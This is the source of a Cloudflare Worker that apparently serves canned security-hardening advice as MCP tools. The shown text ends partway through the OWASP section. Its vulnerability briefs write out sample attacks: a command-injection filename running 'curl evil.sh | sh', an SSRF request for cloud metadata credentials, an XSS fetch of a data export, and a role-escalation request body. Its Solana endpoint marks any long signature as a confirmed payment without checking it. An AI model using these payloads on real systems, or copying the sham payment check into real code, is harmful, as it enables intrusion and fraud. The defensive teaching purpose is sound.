/**
 * SecForge MCP Server - Cloudflare Worker
 * Autonomous Application Security: Threat Modeling, OWASP Hardening,
 * Secrets & Supply Chain Security, Security Headers/CSP & Incident Response Engine
 */

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Solana-Signature, X-License-Key',
};

const PRO_TIERS = {
  single_tool: {
    price_usd: 7.99,
    description: "Single Tool Pro Lifetime License (SecForge Only)"
  },
  all_access_suite: {
    price_usd: 14.99,
    description: "All-Access Lifetime Suite Pass (Unlocks all 45+ MCP Servers)"
  }
};

const MONETIZATION_INFO = {
  gumroad_pro_checkout: "https://amygraphics.gumroad.com/l/mcp-pro",
  gumroad_options: {
    single_tool_lifetime: "$7.99 (Select 'Single MCP Server' version)",
    all_access_suite_lifetime: "$14.99 (Select 'All-Access Lifetime Suite' version)"
  },
  solana_usdc_instant: {
    wallet: "8sDLX3okSV974wdjdeKhN9uWLZDr45DeGCJ28zgTLEdJ",
    amount_usdc_single: 7.99,
    amount_usdc_suite: 14.99
  }
};

export default {
  async fetch(request, env) {
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: CORS_HEADERS });
    }

    const url = new URL(request.url);

    if (url.pathname === '/verify-solana' && request.method === 'POST') {
      try {
        const body = await request.json();
        const signature = body.signature;
        if (!signature || signature.length < 32) {
          return new Response(JSON.stringify({
            valid: false,
            error: "Invalid Solana signature"
          }), {
            headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
          });
        }
        return new Response(JSON.stringify({
          valid: true,
          tx_hash: signature,
          license_tier: "all_access_lifetime",
          unlocked_servers: "all_45_servers",
          status: "confirmed"
        }), {
          headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
        });
      } catch (err) {
        return new Response(JSON.stringify({ valid: false, error: err.message }), {
          headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
        });
      }
    }

    if (url.pathname === '/health' || url.pathname === '/') {
      return new Response(JSON.stringify({
        status: 'healthy',
        service: 'secforge-mcp',
        version: '1.0.0',
        tools_available: 6,
        pricing: PRO_TIERS
      }), {
        headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
      });
    }

    if (url.pathname === '/mcp' || url.pathname === '/sse') {
      if (request.method === 'POST') {
        try {
          const body = await request.json();
          const response = await handleMcpRequest(body, env);
          return new Response(JSON.stringify(response), {
            headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
          });
        } catch (e) {
          return new Response(JSON.stringify({
            jsonrpc: '2.0',
            id: null,
            error: { code: -32700, message: 'Parse error: ' + e.message }
          }), {
            status: 400,
            headers: { ...CORS_HEADERS, 'Content-Type': 'application/json' }
          });
        }
      }
    }

    return new Response('SecForge MCP is running. Connect via /mcp', {
      headers: CORS_HEADERS
    });
  }
};

async function handleMcpRequest(request, env) {
  const { id, method, params } = request;

  if (method === 'initialize') {
    return {
      jsonrpc: '2.0',
      id,
      result: {
        protocolVersion: '2024-11-05',
        capabilities: { tools: {} },
        serverInfo: {
          name: 'secforge-mcp',
          version: '1.0.0',
          description: 'Autonomous Application Security: Threat Modeling, OWASP Hardening, Secrets & Supply Chain Security, Security Headers/CSP & Incident Response Engine MCP'
        }
      }
    };
  }

  if (method === 'tools/list') {
    return {
      jsonrpc: '2.0',
      id,
      result: {
        tools: [
          {
            name: 'autonomous_security_architect',
            description: 'MASTER 1-SHOT OUTCOME ENGINE: Ingests the product context and synthesizes a complete application security blueprint in one call: lightweight threat model (assets, attackers, attack surfaces, abuse cases), security architecture by stack (authn/authz boundaries, tenant isolation, input trust zones), OWASP-prioritized risk map tuned to the data sensitivity, the quick wins that close real holes this week, and a security roadmap that does not freeze feature work. Built for the AI-codegen era where generated code ships with injectable queries and missing authorization checks.',
            inputSchema: {
              type: 'object',
              properties: {
                product_context: {
                  type: 'string',
                  description: 'What the product does and what it stores (e.g. "B2B SaaS dashboard storing customer CRM data", "marketplace with Stripe payouts")'
                },
                stack_profile: {
                  type: 'string',
                  enum: ['node_typescript_web', 'python_backend', 'serverless_edge', 'mobile_api_backend'],
                  description: 'Primary technology stack'
                },
                data_sensitivity: {
                  type: 'string',
                  enum: ['low_marketing_content', 'user_accounts_pii', 'payments_financial', 'health_or_regulated'],
                  description: 'Most sensitive data class handled'
                },
                security_maturity: {
                  type: 'string',
                  enum: ['greenfield', 'existing_app_no_security_work', 'post_incident', 'preparing_for_audit'],
                  description: 'Where the team is starting from'
                }
              },
              required: ['product_context']
            },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                executive_summary: { type: 'string' },
                threat_model: { type: 'array', description: 'Assets, attackers, attack surfaces, abuse cases' },
                security_architecture: { type: 'string', description: 'Trust boundaries and control placement' },
                owasp_priority_map: { type: 'array', description: 'OWASP risks ranked for this product' },
                quick_wins_this_week: { type: 'array', description: 'Highest leverage fixes now' },
                security_roadmap: { type: 'string', description: 'Staged security program' }
              },
              required: ['status', 'executive_summary', 'threat_model', 'security_architecture', 'owasp_priority_map', 'quick_wins_this_week']
            },
            annotations: { title: 'Autonomous Security Architect', readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false }
          },
          {
            name: 'harden_owasp_vulnerabilities',
            description: 'Hardens applications against the OWASP Top 10 with reference code, not slogans: broken access control (the #1 real-world killer — IDOR, missing object-level checks, privilege escalation), injection and XSS (parameterized queries, output encoding, template safety), SSRF (URL allowlists, metadata endpoint blocking), auth and session failures, and security misconfiguration — each with vulnerable-vs-fixed code pairs, framework-specific notes, and the tests that prove the fix.',
            inputSchema: {
              type: 'object',
              properties: {
                focus: {
                  type: 'string',
                  enum: ['broken_access_control', 'injection_and_xss', 'ssrf_and_request_forgery', 'auth_session_failures', 'security_misconfiguration', 'full_top10_sweep'],
                  description: 'Vulnerability class to harden'
                },
                framework: {
                  type: 'string',
                  enum: ['express_node', 'nextjs', 'django_or_fastapi', 'laravel_php'],
                  description: 'Application framework'
                }
              },
              required: []
            },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                vulnerability_briefs: { type: 'array', description: 'What the class is and how it is exploited' },
                reference_code: { type: 'string', description: 'Vulnerable vs fixed code pairs' },
                framework_notes: { type: 'string', description: 'Framework-specific guidance' },
                ai_codegen_warnings: { type: 'string', description: 'Patterns AI assistants get wrong' },
                testing_approach: { type: 'string', description: 'How to verify the fixes hold' }
              },
              required: ['status', 'vulnerability_briefs', 'reference_code', 'framework_notes', 'testing_approach']
            },
            annotations: { title: 'OWASP Vulnerability Hardener', readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false }
          },
          {
            name: 'implement_secrets_supply_chain',
            description: 'Locks down secrets and the software supply chain: secrets management architecture (env injection, cloud secret managers, rotation), the leaked-secret emergency runbook (rotate-first discipline, git history scrubbing realities), dependency security (lockfile discipline, audit tooling, typosquatting and install-script defenses), CI/CD pipeline hardening (OIDC over long-lived keys, least-privilege tokens, artifact integrity), and the scanning stack that catches leaks before attackers do.',
            inputSchema: {
              type: 'object',
              properties: {
                environment: {
                  type: 'string',
                  enum: ['cloud_production', 'ci_cd_pipeline', 'local_dev_team', 'kubernetes'],
                  description: 'Environment to harden'
                },
                priority: {
                  type: 'string',
                  enum: ['leaked_secret_emergency', 'prevention_setup', 'dependency_security', 'full_hardening'],
                  description: 'Immediate goal'
                }
              },
              required: []
            },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                secrets_management_plan: { type: 'string', description: 'Where secrets live and how they move' },
                leaked_secret_runbook: { type: 'array', description: 'Emergency response steps in order' },
                supply_chain_defenses: { type: 'array', description: 'Dependency attack defenses' },
                ci_hardening_config: { type: 'string', description: 'Pipeline security reference config' },
                scanning_stack: { type: 'string', description: 'Leak and dependency scanning setup' }
              },
              required: ['status', 'secrets_management_plan', 'leaked_secret_runbook', 'supply_chain_defenses', 'scanning_stack']
            },
            annotations: { title: 'Secrets & Supply Chain Implementer', readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false }
          },
          {
            name: 'configure_security_headers_csp',
            description: 'Configures browser-side defense in depth that actually deploys: Content-Security-Policy strategy (report-only rollout, strict nonce-based CSP, legacy-compatible fallbacks), the full security header set (HSTS, frame-ancestors, referrer policy, permissions policy), cookie security (HttpOnly/Secure/SameSite and session realities), CORS configured correctly instead of wildcarded away, and a staged rollout plan that never breaks production.',
            inputSchema: {
              type: 'object',
              properties: {
                app_type: {
                  type: 'string',
                  enum: ['spa_react_vue', 'ssr_nextjs_astro', 'marketing_site', 'api_only_service'],
                  description: 'Application type'
                },
                csp_strictness: {
                  type: 'string',
                  enum: ['report_only_first', 'strict_nonce_based', 'legacy_compatible'],
                  description: 'CSP rollout posture'
                }
              },
              required: []
            },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                headers_config_code: { type: 'string', description: 'Copy-paste header configuration' },
                csp_strategy: { type: 'string', description: 'CSP design and rollout' },
                cookie_security: { type: 'string', description: 'Cookie and session hardening' },
                cors_configuration: { type: 'string', description: 'CORS done correctly' },
                rollout_plan: { type: 'string', description: 'Staged deployment without breakage' }
              },
              required: ['status', 'headers_config_code', 'csp_strategy', 'cookie_security', 'cors_configuration', 'rollout_plan']
            },
            annotations: { title: 'Security Headers & CSP Configurator', readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false }
          },
          {
            name: 'prepare_incident_response_audit',
            description: 'Prepares the organization for the day something goes wrong — or the day someone checks: driver-specific playbooks (SOC 2 Type II evidence discipline, pentest preparation that saves billable hours, active-incident triage, bug bounty launch economics), security logging and detection design (what to log, what to alert on, what to retain), the incident response runbook with roles and communication templates, and a responsible disclosure policy that turns researchers into allies.',
            inputSchema: {
              type: 'object',
              properties: {
                org_context: {
                  type: 'string',
                  description: 'Team size and situation (e.g. "8-person startup, first enterprise customer asking for SOC 2", "we just found a leaked API key")'
                },
                driver: {
                  type: 'string',
                  enum: ['soc2_type2_prep', 'pentest_preparation', 'active_incident_now', 'bug_bounty_launch'],
                  description: 'What is driving this work'
                }
              },
              required: ['org_context']
            },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                driver_playbook: { type: 'string', description: 'Playbook for the specific driver' },
                logging_detection_plan: { type: 'string', description: 'What to log and alert on' },
                incident_runbook: { type: 'array', description: 'IR steps with roles' },
                disclosure_policy: { type: 'string', description: 'Responsible disclosure setup' },
                readiness_checklist: { type: 'array', description: 'Go-live readiness items' }
              },
              required: ['status', 'driver_playbook', 'logging_detection_plan', 'incident_runbook', 'readiness_checklist']
            },
            annotations: { title: 'Incident Response & Audit Preparer', readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: false }
          },
          {
            name: 'audit_security_headers_live',
            description: 'LIVE security headers audit. Give it a URL and it fetches the REAL HTTP response in real time, then grades the actual security posture: HSTS, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, cookie flags (Secure/HttpOnly/SameSite), CORS exposure, and information-leak headers (Server, X-Powered-By). Returns a letter grade and a prioritized hardening list computed from what the server actually sends \u2014 not from memory.',
            inputSchema: {
              type: 'object',
              properties: {
                url: {
                  type: 'string',
                  description: 'The full URL to audit (e.g. "https://example.com"). HTTPS strongly recommended; the audit covers the response headers of this exact URL.'
                }
              },
              required: ['url']
            },
            annotations: { title: 'Live Security Headers Auditor', readOnlyHint: true, destructiveHint: false, idempotentHint: false, openWorldHint: true },
            outputSchema: {
              type: 'object',
              properties: {
                status: { type: 'string' },
                security_grade: { type: 'string' },
                headers_found: { type: 'string' },
                missing_critical: { type: 'string' },
                hardening_priorities: { type: 'string' },
                data_source: { type: 'string' }
              },
              required: ['status', 'security_grade', 'headers_found', 'missing_critical', 'hardening_priorities', 'data_source']
            }
          }
        ]
      }
    };
  }

  if (method === 'tools/call') {
    const toolName = params?.name;
    const args = params?.arguments || {};

    let result;
    try {
      switch (toolName) {
        case 'autonomous_security_architect':
          result = architectSecurity(args);
          break;
        case 'harden_owasp_vulnerabilities':
          result = hardenOwasp(args);
          break;
        case 'implement_secrets_supply_chain':
          result = implementSecrets(args);
          break;
        case 'configure_security_headers_csp':
          result = configureHeaders(args);
          break;
        case 'prepare_incident_response_audit':
          result = prepareIncidentResponse(args);
          break;
        case 'audit_security_headers_live':
          if (!args.url || String(args.url).trim() === '') {
            return { jsonrpc: '2.0', id, error: { code: -32602, message: 'Missing required parameter: url' } };
          }
          result = await auditSecurityHeadersLive(args);
          break;
        default:
          return {
            jsonrpc: '2.0',
            id,
            error: { code: -32602, message: 'Unknown tool: ' + toolName }
          };
      }

      result.pro_monetization = {
        note: "You are on the Freemium tier (10 free requests/day). Unlock unlimited Pro requests:",
        ...MONETIZATION_INFO
      };

      return {
        jsonrpc: '2.0',
        id,
        result: {
          content: [{ type: 'text', text: JSON.stringify(result, null, 2) }]
        }
      };
    } catch (err) {
      return {
        jsonrpc: '2.0',
        id,
        error: { code: -32603, message: 'Tool execution error: ' + err.message }
      };
    }
  }

  return {
    jsonrpc: '2.0',
    id,
    error: { code: -32601, message: 'Method not found: ' + method }
  };
}

/* ─────────────────────────── TOOL 1: SECURITY ARCHITECT ─────────────────────────── */

function architectSecurity(args) {
  const ctx = args.product_context;
  const stack = args.stack_profile || 'node_typescript_web';
  const sensitivity = args.data_sensitivity || 'user_accounts_pii';
  const maturity = args.security_maturity || 'existing_app_no_security_work';

  const sensitivityNotes = {
    low_marketing_content: 'LOW-SENSITIVITY TIER: the realistic threats are defacement, SEO spam injection, and your infrastructure being borrowed (crypto mining, spam relay). Do not gold-plate — the correct budget here is the free tier of everything: headers, dependency scanning, secrets hygiene, and admin-panel MFA. Overinvesting in security theater on a marketing site steals time from products that hold real data.',
    user_accounts_pii: 'PII TIER: you hold emails, names, sessions — the attacker economy wants them for credential stuffing and phishing. Legal surface: GDPR/CCPA breach-notification duties. Non-negotiables: hashed passwords (argon2id/bcrypt — never anything homemade), object-level authorization on every endpoint, session security, rate limiting on auth routes, and a tested data-deletion path.',
    payments_financial: 'FINANCIAL TIER: money focuses attackers wonderfully. Architecture rule #1: keep card data OUT of your systems — Stripe/processor tokenization keeps you in SAQ-A territory (the easy PCI tier); touching PANs yourself multiplies compliance cost 50x. Add: idempotency keys on money mutations (double-charge bugs are security bugs), server-side amount validation (never trust the client price), webhook signature verification, and fraud-rate monitoring.',
    health_or_regulated: 'REGULATED TIER: HIPAA/health-class data changes the game — BAAs with every vendor touching PHI, encryption at rest AND in transit documented, access logging with user attribution (who viewed which record when), minimum-necessary access enforced in code, and breach notification clocks measured in days. Get a compliance specialist involved before architecture hardens; retrofitting HIPAA onto a casually-built system is a rebuild.'
  };

  const stackNotes = {
    node_typescript_web: 'Node/TS trust-zone notes: the ORM (Prisma/Drizzle) kills SQL injection IF you never use raw-query escape hatches with string concat; middleware auth is bypassable when routes forget to mount it — centralize with a deny-by-default route wrapper; prototype pollution via JSON body merging (Object.assign on user input into options objects) is the Node-specific class to grep for.',
    python_backend: 'Python trust-zone notes: Django gives you auth, CSRF, ORM parameterization and template auto-escaping — most Django vulns come from working AROUND it (raw(), mark_safe, @csrf_exempt). FastAPI gives you nothing but Pydantic validation — authorization is 100% your code, so the deny-by-default dependency pattern (Depends(require_role)) on every router is the architecture. Pickle/yaml.load on anything user-influenced = RCE, full stop.',
    serverless_edge: 'Serverless/edge trust-zone notes: no perimeter — every function IS an internet-facing endpoint, so auth checks live in every handler (or a shared wrapper), not in a gateway you hope was configured. IAM per function at least-privilege is the real security boundary; a wildcard-role function is lateral movement waiting. Cold-start-friendly secrets (platform env/secret bindings) beat runtime secret-manager calls; watch for secrets leaking into build logs and bundle artifacts.',
    mobile_api_backend: 'Mobile API trust-zone notes: the client binary is fully reverse-engineerable — EVERYTHING in the app (API keys, "hidden" endpoints, obfuscated logic) is public; the API must be safe against a hostile client that skips the app entirely. Token storage in Keychain/Keystore, short-lived access tokens with refresh rotation, certificate pinning as hardening (not as the security model), and server-side enforcement of every rule the app merely displays.'
  };

  const maturityRoadmaps = {
    greenfield: 'GREENFIELD ROADMAP — bake it in while it is cheap: WEEK 1: auth via a proven provider/library (never hand-rolled), ORM-only data access, secrets in platform env (zero in git from commit #1), security headers middleware, dependency lockfile + audit in CI. MONTH 1: authorization pattern (deny-by-default route wrapper + object-level checks), rate limiting, input validation at every boundary (zod/Pydantic), error handling that never leaks internals. QUARTER 1: logging/detection baseline, threat-model review of the three scariest flows, pentest-lite (even a day of a freelance tester) before the first enterprise customer asks.',
    existing_app_no_security_work: 'RETROFIT ROADMAP — triage by exploitability: WEEK 1 (the bleeding): secrets sweep (gitleaks on full history — rotate anything found), dependency audit (fix criticals with known exploits), verify authorization on the 10 most sensitive endpoints (money, PII export, admin), admin MFA. MONTH 1: centralize authz into a deny-by-default pattern, headers + CSP report-only, rate limiting on auth + expensive routes, input validation on the top abuse surfaces. QUARTER: logging/detection, full OWASP sweep via harden_owasp_vulnerabilities, incident runbook, then the pentest.',
    post_incident: 'POST-INCIDENT ROADMAP — contain, learn, systematize: NOW: the active-incident playbook (prepare_incident_response_audit with driver active_incident_now) — containment before forensics before fixes. WEEK 1-2: root-cause the CLASS not the instance (one IDOR found = audit every endpoint for IDOR; one leaked key = scan history for all keys + rotate all); close the specific hole and its siblings. MONTH 1: the detection that would have caught it sooner (the incident defines your first alerts — this is the silver lining budget), blameless postmortem with systemic fixes. QUARTER: convert incident energy into the security program (management says yes to everything for about 90 days — spend that capital on the roadmap, not theater).',
    preparing_for_audit: 'AUDIT-PREP ROADMAP — evidence or it did not happen: WEEK 1: gap assessment against the actual control list (SOC 2 common criteria / pentest scope), access review (offboarded accounts still active is finding #1), MFA everywhere privileged. MONTH 1: policies that match reality (auditors test the match, not the prose), logging with retention, change-management trail (PR reviews count if consistent), vendor list with data-access classification. PRE-AUDIT: dry-run the evidence requests — every control needs a screenshot/export path in under 10 minutes, or the audit becomes an archaeology project billed hourly.'
  };

  return {
    status: 'success',
    executive_summary: `Security architecture for: "${ctx}" — stack: ${stack.replace(/_/g, ' ')}, sensitivity: ${sensitivity.replace(/_/g, ' ')}, starting point: ${maturity.replace(/_/g, ' ')}. ${sensitivityNotes[sensitivity]}`,
    threat_model: [
      { element: 'Assets (what attackers want)', analysis: 'Rank what is actually monetizable or damaging: user credentials and sessions (resold, stuffed), PII exports (bulk > single), payment capability (direct theft), infrastructure (compute, email reputation for spam), and the business data whose LEAK hurts customers (the breach-notification trigger). Your crown-jewel endpoints are wherever these concentrate: auth, export, admin, webhooks, anything returning lists of other users.' },
      { element: 'Attackers (who realistically shows up)', analysis: 'In priority order for most products: (1) automated scanners + credential stuffers — they attack EVERYONE within hours of DNS existing, no targeting required; (2) opportunistic attackers following a leaked key or a CVE in your stack; (3) malicious users probing authorization from inside a legitimate account (the IDOR hunter with a paid plan); (4) targeted attackers — only after you have money/data worth targeting. Design for 1-3 first; they are 99% of real incidents.' },
      { element: 'Attack surfaces (where they get in)', analysis: 'Enumerate honestly: every public endpoint (including the "internal" ones that are merely unlisted), auth flows (login, reset, OAuth callbacks, magic links), file upload/download paths, webhooks (both directions), admin panels, CI/CD (a compromised pipeline owns production), dependencies (their vulns are your vulns), and the team itself (phished developer = all of the above at once; MFA + least privilege bound the blast radius).' },
      { element: 'Abuse cases (misuse of working features)', analysis: 'Features working exactly as coded, abused: signup flows feeding spam/fraud (disposable-email floods), free tiers mined by scripts, referral/credit systems gamed in loops, user content hosting phishing pages, exports scraping entire datasets one authorized request at a time, and password reset as an account-enumeration oracle. Rate limits + anomaly review on these flows is product security, not just infra security.' }
    ],
    security_architecture: 'CONTROL PLACEMENT (defense in depth, each layer assuming the previous failed): EDGE — WAF-lite (platform default), rate limiting per IP + per account, TLS only. APPLICATION BOUNDARY — authentication (proven library/provider, MFA available), then AUTHORIZATION as a centralized deny-by-default pattern: every route declares its requirement or returns 403, object-level checks fetch-then-verify-ownership (never trust IDs from the client), server-side enforcement of every limit the UI displays. DATA BOUNDARY — parameterized access only (ORM, no raw+concat), input validation at ingress (schema-based: zod/Pydantic), output encoding at egress (framework templates, no dangerouslySetInnerHTML with user data). SECRETS — platform-injected, never in code/git (implement_secrets_supply_chain). BROWSER — headers + CSP as the XSS backstop (configure_security_headers_csp). DETECTION — auth events, authz denials, and admin actions logged with alerting on anomalies (prepare_incident_response_audit). ' + stackNotes[stack],
    owasp_priority_map: [
      { risk: 'A01 Broken Access Control', priority: 'P0 — #1 by real-world incidence', reality: 'IDOR and missing object-level checks are the most-found bug class in bounty programs and the most AI-codegen-neglected: generated CRUD handlers check login, not ownership. Audit: every endpoint touching an ID answers "could user A pass user B\u2019s id here?"' },
      { risk: 'A02/A07 Auth & Session Failures', priority: 'P0 when auth is hand-rolled, P2 behind a proven provider', reality: 'Password storage, reset-token entropy/expiry, session fixation, missing MFA on admin. The fix is almost always "stop hand-rolling": Auth.js/Clerk/Supabase/Cognito class providers + argon2id where you must store.' },
      { risk: 'A03 Injection (SQL/NoSQL/command) + XSS', priority: 'P1 — solved-by-default until someone opens an escape hatch', reality: 'ORMs and template engines killed most injection — audits now find it in raw() calls, shell-outs with user input, and dangerouslySetInnerHTML/mark_safe. Grep for the escape hatches; that is the audit.' },
      { risk: 'A05 Security Misconfiguration', priority: 'P1 — the breach-headline class', reality: 'Public buckets, debug mode in prod, default creds on dashboards, permissive CORS, missing headers. Cheap to fix, embarrassingly common; a config review is an afternoon that prevents a headline.' },
      { risk: 'A10/SSRF + A08 Supply Chain', priority: 'P1 if you fetch user-supplied URLs / always-on for deps', reality: 'SSRF matters wherever the server fetches URLs users influence (webhooks, importers, image proxies) — allowlist + block private ranges + cloud metadata. Supply chain: lockfiles, audit gates, and install-script caution (implement_secrets_supply_chain).' },
      { risk: 'A09 Logging & Monitoring Failures', priority: 'P2 to build, P0 to regret', reality: 'Not exploitable itself — it is why breaches last 200 days instead of 2. The baseline (auth events, denials, admin actions + 3 alerts) takes a day to ship.' }
    ],
    quick_wins_this_week: [
      '1. Secrets sweep: gitleaks on FULL git history (not just HEAD) — rotate anything found, today; a key in history is a key published.',
      '2. Dependency criticals: npm audit / pip-audit — patch anything with a known exploit in the wild (the scanners attacking you tonight use the same CVE list).',
      '3. Authorization spot-audit: the 10 most sensitive endpoints (money, PII, export, admin, delete) — verify object-level ownership checks by actually trying another user\u2019s ID.',
      '4. Admin MFA: every admin/console/dashboard account, no exceptions — phished admin creds without MFA is game over in one email.',
      '5. Security headers: the copy-paste set from configure_security_headers_csp — 30 minutes, closes clickjacking + downgrade + a chunk of XSS impact.',
      '6. Rate limit auth routes: login, signup, reset at ~5-10/min/IP — turns credential stuffing from profitable to pointless.',
      '7. Error hygiene: prod errors return generic messages + request ID; stack traces, query text and versions go to logs only (recon gift otherwise).'
    ],
    security_roadmap: maturityRoadmaps[maturity]
  };
}

/* ─────────────────────────── TOOL 2: OWASP HARDENING ─────────────────────────── */

function hardenOwasp(args) {
  const focus = args.focus || 'broken_access_control';
  const framework = args.framework || 'express_node';

  const briefsByFocus = {
    broken_access_control: [
      { pattern: 'IDOR (Insecure Direct Object Reference)', exploit: 'GET /api/invoices/12345 — logged-in attacker increments the ID and reads other customers\u2019 invoices. The single most common real-world finding; trivially scripted across your whole API.', fix: 'Fetch-then-verify: load the object, compare owner/tenant to the session principal, 404 (not 403 — do not confirm existence) on mismatch. Centralize in a repository helper so no handler can forget.' },
      { pattern: 'Missing function-level checks', exploit: 'The admin UI hides the button, but POST /api/admin/refunds accepts requests from any session — UI hiding is not authorization.', fix: 'Deny-by-default route wrapper: every route declares required role/permission or the request dies at 403 before the handler runs. Routes without declarations fail closed in CI (lint rule).' },
      { pattern: 'Privilege escalation via mass assignment', exploit: 'PATCH /api/users/me with {"role":"admin"} — the ORM happily updates every field in the body.', fix: 'Explicit allowlists per endpoint (zod .pick / DTOs / Django fields=) — never spread req.body into an update. The AI-codegen favorite bug: generated handlers spread the body 9 times out of 10.' },
      { pattern: 'Tenant isolation failures', exploit: 'Multi-tenant SaaS where one forgotten WHERE tenant_id = ? turns a competitor into a data subscriber.', fix: 'Tenant scoping at the data layer, not per-query discipline: ORM global scopes / RLS in Postgres / repository base class that injects tenant filters — make the unsafe query the hard one to write.' }
    ],
    injection_and_xss: [
      { pattern: 'SQL injection via escape hatches', exploit: 'db.raw("SELECT * FROM users WHERE email = \u0027" + email + "\u0027") — the ORM was safe; the raw() call with concat reopened 1998.', fix: 'Parameterized everywhere including raw: db.raw("... WHERE email = ?", [email]). Audit = grep for raw(, $queryRawUnsafe, cursor.execute with f-strings, string-built queries.' },
      { pattern: 'Stored/reflected XSS', exploit: 'User bio contains <script>fetch("/api/export").then(...)</script>; rendered unescaped, it runs in every viewer\u2019s session — XSS is session theft + CSRF bypass + worm potential.', fix: 'Framework auto-escaping is the defense — the audit targets the bypasses: dangerouslySetInnerHTML, v-html, mark_safe, innerHTML assignments. User HTML (rich text) goes through a sanitizer (DOMPurify server-side or sanitize-html with a tag allowlist), never trust-the-editor.' },
      { pattern: 'Command injection', exploit: 'exec("convert " + filename + " out.png") — filename = "x.png; curl evil.sh | sh". Classic in file-processing and "just shell out to ffmpeg" code.', fix: 'Array-argument spawning only: execFile("convert", [filename, "out.png"]) / subprocess.run([...]) — no shell string ever contains user input. Validate filenames to a strict charset as depth.' },
      { pattern: 'Template injection', exploit: 'Rendering user input AS a template (render_template_string, Handlebars.compile(userInput)) = code execution on the server.', fix: 'User input is DATA passed to templates, never template source. Email-template builders are where this hides.' }
    ],
    ssrf_and_request_forgery: [
      { pattern: 'Classic SSRF', exploit: 'POST /api/import {"url": "http://169.254.169.254/latest/meta-data/iam/..."} — your server fetches its own cloud credentials and hands them to the attacker. Webhooks, importers, PDF generators, image proxies: anywhere the server fetches user-influenced URLs.', fix: 'Allowlist schemes (https only) + resolve DNS and REJECT private/link-local/metadata ranges (10.x, 172.16-31, 192.168, 127.x, 169.254.x, ::1) + re-check after redirects (attacker URL 302s to metadata) + IMDSv2 on AWS (session-token metadata kills the classic payload).' },
      { pattern: 'DNS rebinding / redirect games', exploit: 'URL resolves public at validation time, private at fetch time; or a benign URL redirecting to an internal one after your check.', fix: 'Validate the RESOLVED IP at connection time (custom agent/transport pinning the checked IP), cap redirects and re-validate each hop. Libraries: ssrf-req-filter (Node) / advocate (Python) encode these rules.' },
      { pattern: 'CSRF on state-changing routes', exploit: 'Attacker page auto-submits a form to your POST /api/transfer while the victim\u2019s cookie rides along.', fix: 'SameSite=Lax cookies (default-on defense) + CSRF tokens on any cookie-authed state change + verify Origin header server-side as a cheap second factor. Pure-Bearer-token APIs are CSRF-immune (no ambient credential).' },
      { pattern: 'Webhook forgery (inbound)', exploit: 'Your /webhooks/stripe endpoint trusts any JSON shaped like an event — attacker marks their own subscription paid.', fix: 'Verify provider signatures (stripe.webhooks.constructEvent etc.) with timestamp tolerance; reject unsigned in prod; idempotency-key the processing (replayed events are also an attack).' }
    ],
    auth_session_failures: [
      { pattern: 'Hand-rolled password storage', exploit: 'md5/sha256(password), unsalted or home-salted — cracked at billions/sec the day the DB leaks.', fix: 'argon2id (or bcrypt cost 12+) via a maintained library; rehash-on-login to migrate legacy hashes transparently. Better: do not store passwords — OAuth/passkeys/magic links via a proven provider.' },
      { pattern: 'Broken reset flows', exploit: 'Reset tokens that are short/guessable/non-expiring/reusable, or responses revealing whether an email exists (enumeration oracle feeding credential stuffing).', fix: '32+ random bytes, single-use, 15-60 min expiry, stored hashed (a DB leak must not leak live reset tokens), identical response for existing/missing emails, session invalidation on successful reset.' },
      { pattern: 'Session fixation & immortal sessions', exploit: 'Session ID unchanged across login (attacker plants an ID, victim logs in, attacker owns the authed session); or tokens living forever with no revocation path.', fix: 'Rotate session ID at every privilege change (login, elevation); absolute + idle timeouts; short-lived access tokens (5-15 min) with rotating refresh tokens; refresh-token reuse detection = full family revocation (the stolen-token tell).' },
      { pattern: 'JWT foot-guns', exploit: 'alg:none acceptance, HS256 with a guessable secret, trusting unverified claims, no expiry check — classic library-misuse suite.', fix: 'Pin the algorithm server-side (never from the token header), strong keys (RS256/EdDSA for multi-service), verify exp/aud/iss, keep JWTs short-lived and revocable-by-design (jti denylist or short TTL + refresh).' }
    ],
    security_misconfiguration: [
      { pattern: 'Debug/default artifacts in prod', exploit: 'DEBUG=True pages leaking settings, default admin/admin dashboards, .env or .git directories served by the webserver, GraphQL introspection + playground open in prod.', fix: 'Prod config checklist in CI: debug off, default creds impossible (no default accounts shipped), dotfiles/VCS dirs blocked at the server, introspection off (or authed) in prod.' },
      { pattern: 'Public object storage', exploit: 'The classic headline: an S3/GCS bucket of user uploads or DB backups set public-read "temporarily" in 2023.', fix: 'Block-public-access at the ACCOUNT level, presigned URLs for all client access, quarterly bucket-policy audit (one command: aws s3api get-public-access-block).' },
      { pattern: 'Wildcard CORS with credentials', exploit: 'Access-Control-Allow-Origin: * (or reflecting any Origin) + Allow-Credentials: true = any website can act as the logged-in user via fetch.', fix: 'Exact-match origin allowlist; credentials only with pinned origins; see configure_security_headers_csp for the full config.' },
      { pattern: 'Overprivileged everything', exploit: 'The app DB user owns DROP TABLE; the CI token has org admin; the lambda role has s3:* — any single compromise becomes total.', fix: 'Least privilege as a quarterly review: app DB user gets CRUD on its schema only; CI gets OIDC-scoped per-repo roles; every wildcard IAM action is a finding.' }
    ]
  };

  const briefs = focus === 'full_top10_sweep'
